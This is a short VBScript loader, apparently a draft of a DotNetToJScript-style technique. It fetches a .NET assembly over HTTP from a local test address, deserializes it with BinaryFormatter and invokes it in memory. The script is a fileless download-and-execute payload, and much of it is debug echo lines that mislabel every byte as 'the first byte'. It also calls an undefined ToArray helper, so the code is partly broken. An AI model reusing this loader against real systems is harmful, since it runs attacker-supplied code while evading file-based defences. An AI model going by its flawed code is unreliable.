Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Environment("Process").Item("COMPLUS_Version") = "v4.0.30319"

Set xHttp = CreateObject("MSXML2.ServerXMLHTTP")
xHttp.Open "GET", "http://127.0.0.1:8000/ExampleAssembly.dll", False
xHttp.Send

Set a = ToArray(xHttp.responseBody)

Wscript.Echo "The first byte is : " & Asc(xHttp.responseBody.toArray()(0))
Wscript.Echo "The first byte is : " & Asc(xHttp.responseBody.toArray()(1))
Wscript.Echo "The first byte is : " & Asc(xHttp.responseBody.toArray()(2))
Wscript.Echo "The first byte is : " & Asc(xHttp.responseBody.toArray()(3))
Wscript.Echo "The first byte is : " & Asc(xHttp.responseBody.toArray()(4))

entry_class = "Program"

Dim ms
Set ms = CreateObject("System.IO.MemoryStream")
ms.Write xHttp.responseBody, 0, UBound(xHttp.responseBody)
ms.Position = 0

Wscript.Echo "The first byte is : 0x" & Asc(ms.ReadByte())
Wscript.Echo "The first byte is : 0x" & Asc(ms.ReadByte())
Wscript.Echo "The first byte is : 0x" & Asc(ms.ReadByte())
Wscript.Echo "The first byte is : 0x" & Asc(ms.ReadByte())
Wscript.Echo "The first byte is : 0x" & Asc(ms.ReadByte())
Wscript.Echo "The first byte is : 0x" & Asc(ms.ReadByte())

Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
Set al = CreateObject("System.Collections.ArrayList")
al.Add Empty

Set d = fmt.Deserialize_2(ms)
Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)